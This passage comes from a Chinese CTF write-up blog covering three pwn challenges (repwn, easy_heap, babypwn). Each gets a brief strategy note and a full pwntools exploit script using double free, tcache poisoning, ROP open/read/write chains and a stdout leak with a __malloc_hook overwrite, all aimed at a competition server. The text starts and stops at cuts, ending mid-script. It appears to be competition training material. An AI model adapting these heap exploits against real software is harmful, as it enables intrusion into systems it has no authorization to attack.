id="repwn"><a href="#repwn" class="headerlink" title="repwn"></a>repwn</h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>只能进行add和free操作，并且有个可以输出栈上信息的函数，通过解密即可得到libc和stack的地址。存在double free漏洞，并且由于禁用了execute的系统调用，所以申请回栈上，通过rop来进行ORW操作。</p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(res)</span>:</span></span><br><span class="line">v5=[<span class="number">51</span>,<span class="number">18</span>,<span class="number">120</span>,<span class="number">36</span>]</span><br><span class="line">v9=<span class="number">9</span></span><br><span class="line">v7=<span class="number">0x26a77aaa</span></span><br><span class="line"><span class="keyword">while</span> v9&gt;<span class="number">0</span>:  </span><br><span class="line">    v10 = (v7 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">v6 = res[(i<span class="number">-1</span>+<span class="number">16</span>)%<span class="number">16</span>]</span><br><span class="line">res[i] -= (((v6 &gt;&gt; <span class="number">7</span>) ^ <span class="number">8</span> * res[(i + <span class="number">1</span>)%<span class="number">16</span>]) + ((res[(i + <span class="number">1</span>)%<span class="number">16</span>] &gt;&gt; <span class="number">2</span>) ^ <span class="number">32</span> * v6) - <span class="number">33</span>) ^ ((res[(i + <span class="number">1</span>)%<span class="number">16</span>] ^ v7 ^ <span class="number">0x57</span>)+ (v6 ^ v5[v10 ^ i &amp; <span class="number">3</span>])+ <span class="number">63</span>)</span><br><span class="line">res[i]&amp;=<span class="number">0xff</span></span><br><span class="line">    v7 -= <span class="number">0x76129BDA</span></span><br><span class="line">    v7&amp;=<span class="number">0xffffffff</span></span><br><span class="line">    v9-=<span class="number">1</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">"re_pwn"</span>).libc</span><br><span class="line"><span class="comment">#p = process("./re_pwn")</span></span><br><span class="line">p = remote(<span class="string">"183.129.189.60"</span>,<span class="string">"10035"</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">" choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"how long?"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">" choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"which one?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)</span><br><span class="line">p.recvuntil(<span class="string">" choice:"</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.send(<span class="string">"\n"</span>)</span><br><span class="line">rev = p.recv(<span class="number">0x10</span>)</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(rev)):</span><br><span class="line">res.append(u32(rev[i]+<span class="string">'\x00'</span>*<span class="number">3</span>))</span><br><span class="line">dec(res)</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(rev)):</span><br><span class="line">s += chr(res[i])</span><br><span class="line">libc.address = u64(s[:<span class="number">6</span>]+<span class="string">'\x00\x00'</span>)<span class="number">-0x5F1A88</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line">stack = u64(s[<span class="number">8</span>:<span class="number">14</span>]+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000021112</span> + libc.address</span><br><span class="line">pop_rsi = <span class="number">0x00000000000202f8</span> + libc.address</span><br><span class="line">pop_rdx = <span class="number">0x0000000000001b92</span> + libc.address</span><br><span class="line">pop_rax = <span class="number">0x000000000003a738</span> + libc.address</span><br><span class="line">pop_rsp = <span class="number">0x0000000000003838</span> + libc.address</span><br><span class="line">syscall = <span class="number">0x00000000000bc3f5</span> + libc.address</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,p64(stack - <span class="number">0xf3</span>))<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)<span class="comment">#4</span></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *'+hex(syscall))</span></span><br><span class="line">pay = <span class="string">'\x00'</span>*<span class="number">0x3</span></span><br><span class="line">pay += p64(pop_rdx)</span><br><span class="line">pay += p64(<span class="number">0x100</span>)</span><br><span class="line">pay += p64(pop_rax)</span><br><span class="line">pay += p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay += p64(pop_rdi)</span><br><span class="line">pay += p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(pop_rsi)</span><br><span class="line">pay += p64(stack<span class="number">-0xe0</span>+<span class="number">5</span>*<span class="number">8</span>+<span class="number">0x10</span>)</span><br><span class="line">pay += p64(pop_rsp)</span><br><span class="line">pay += p64(stack<span class="number">-0xe0</span>)</span><br><span class="line"><span class="keyword">print</span> hex(len(pay))</span><br><span class="line">add(<span class="number">0x68</span>,pay)<span class="comment">#5</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(stack+<span class="number">0x30</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(stack+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(stack+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="string">'./flag\x00'</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload+<span class="string">'\n'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h3><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>存在double free漏洞。首先填满tcache，并leak出libc地址。接着修改堆上指向name堆块的地址为environ变量，从而leak出stack地址。接着通过tcache的double free任意申请地址到栈上，从而用rop来进行ORW操作获取flag。</p><h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./easy_heap"</span>)</span><br><span class="line">p = remote(<span class="string">"183.129.189.60"</span>,<span class="number">10009</span>)</span><br><span class="line">libc = ELF(<span class="string">"easy_heap"</span>).libc</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"ontent: "</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">b'\x00'</span>*<span class="number">2</span>) - <span class="number">0x3a0</span></span><br><span class="line">print(hex(heap))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">free(<span class="number">3</span>-i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xb</span>):</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x7</span>):</span><br><span class="line">add(<span class="number">0x1f8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(<span class="number">6</span>-i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">9</span>,p64(heap+<span class="number">0xb90</span>)*<span class="number">2</span>+<span class="string">b'\x00'</span>*<span class="number">0xe0</span>+p64(<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">0xa</span>)</span><br><span class="line">add(<span class="number">0x1f8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xb</span>,<span class="number">0xb</span>+<span class="number">8</span>):</span><br><span class="line">free(i)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"ontent: "</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">b'\x00'</span>*<span class="number">2</span>) - <span class="number">0x1EBBE0</span></span><br><span class="line">print(hex(libc.address))</span><br><span class="line">add(<span class="number">0x2f8</span>)</span><br><span class="line">add(<span class="number">0x2f8</span>)</span><br><span class="line">add(<span class="number">0x2f8</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(libc.sym[<span class="string">'environ'</span>]))</span><br><span class="line">add(<span class="number">0x2f8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x2f8</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">"ontent: "</span>)</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>)+<span class="string">b'\x00'</span>*<span class="number">2</span>) </span><br><span class="line">print(hex(stack))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(stack<span class="number">-0x120</span>))</span><br><span class="line">add(<span class="number">0x2f8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x2f8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x16A0)')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000026b72</span> + libc.address</span><br><span class="line">pop_rsi = <span class="number">0x0000000000027529</span> + libc.address</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011c1e1</span> + libc.address</span><br><span class="line">pop_rax = <span class="number">0x000000000004a550</span> + libc.address</span><br><span class="line">syscall = <span class="number">0xE6169</span>+ libc.address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(stack<span class="number">-0x30</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rdx_r12)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(stack+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx_r12)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(stack+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx_r12)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="string">b'./flag\x00'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><p>比较恶心的概率题。首先通过<code>malloc_consolidate()</code>将fastbin中的堆块放入smallbin中，从而得到libc的地址。申请回来，修改低位，爆破到stdout结构附近。接着利用double free，并修改低位地址，爆破到上述存储有stdout结构地址处的堆块，从而申请到stdout处进行IO_leak。接着就是double free申请到<code>__malloc_hook</code>然后用<code>one_gadgets</code>来getshell。PS:1/256概率，日常脸黑，打了半个多小时才出来。</p><h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process("babypwn")</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">libc = ELF(<span class="string">"babypwn"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"><span class="comment">#p = process("babypwn")</span></span><br><span class="line">p = remote(<span class="string">"183.129.189.60"</span>,<span class="string">"10031"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,message)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"game's name: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">" message:"</span>)</span><br><span class="line">p.send(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>*<span class="number">0x400</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\xdd\x25'</span>,<span class="string">'a\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x30\x70'</span>,<span class="string">'a\n'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#0</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#2</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"game's name: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x68</span>))</span><br><span class="line">p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">p.send(<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line"><span class="keyword">print</span> p.recv(<span class="number">0x18</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>)) <span class="number">-0x3C5600</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"game's"</span>)</span><br><span class="line">p.send(<span class="string">'a\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p64(libc.sym[<span 